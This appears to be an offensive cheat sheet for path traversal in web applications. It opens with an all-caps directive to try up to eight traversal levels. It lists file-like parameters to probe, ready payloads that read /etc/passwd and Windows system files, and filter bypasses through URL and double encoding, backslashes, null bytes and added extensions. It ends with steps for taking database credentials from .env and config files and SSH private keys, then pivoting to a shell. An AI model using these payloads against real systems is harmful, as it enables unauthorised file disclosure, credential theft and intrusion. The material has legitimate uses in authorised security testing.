
**MAKE SURE TO TRY UP TO 8 LEVELS OF TRAVERSAL TO BE THOROUGH**

### 1. Identify Potential Targets

- Look for **parameters suggesting files/paths**:
    
    - `?file=`, `?page=`, `?img=`, `?doc=`, `?download=`, `?template=`
        
- Watch for **error messages** that reveal local paths (e.g., `/var/www/html/...`).
    
- Any place serving user documents, logs, or images → suspect traversal.
    

---

### 🛠️ 2. Test Basic Traversal

Try with Unix/Linux paths:

`?file=../../etc/passwd` 
`?file=../../../etc/passwd` 
`?file=../../../../etc/hosts`

Try with Windows paths:

`?file=..\..\..\..\windows\win.ini ?file=..\..\..\..\windows\system32\drivers\etc\hosts`

---

### 🔄 3. Bypass Filters

If `../` blocked, try:

- URL encoding:
    
    `%2e%2e%2fetc/passwd` 
    `%252e%252e%252fetc/passwd`   (double encode)`
    
- Backslashes for Windows:
    
    `..\..\..\..\windows\win.ini` 
    `..%5c..%5c..%5cwindows%5cwin.ini`
    
- Null byte injection (older PHP apps):
    
    `../../etc/passwd%00`
    
- Add extensions if required:
    
    `../../etc/passwd.txt` 
    `../../etc/passwd.pdf`
    
- Try absolute path:
    
    `/etc/passwd` 
    

---

### 📂 4. Confirm with Known Files

Linux targets:

`/etc/passwd`       → user accounts 
`/etc/hosts`        → hostnames 
`/var/log/apache2/access.log` → web logs 
`/proc/self/environ` → environment variables`

Windows targets:

`C:\Windows\win.ini` 
`C:\Windows\System32\drivers\etc\hosts`

---

### 🧩 5. Escalate

- Once traversal works, enumerate:
    
    - Config files (db creds): `config.php`, `.env`, `settings.py`
        
    - SSH keys: `/home/user/.ssh/id_rsa`
        
    - Application logs
        
- Pivot from file disclosure → **credentials → shell.**







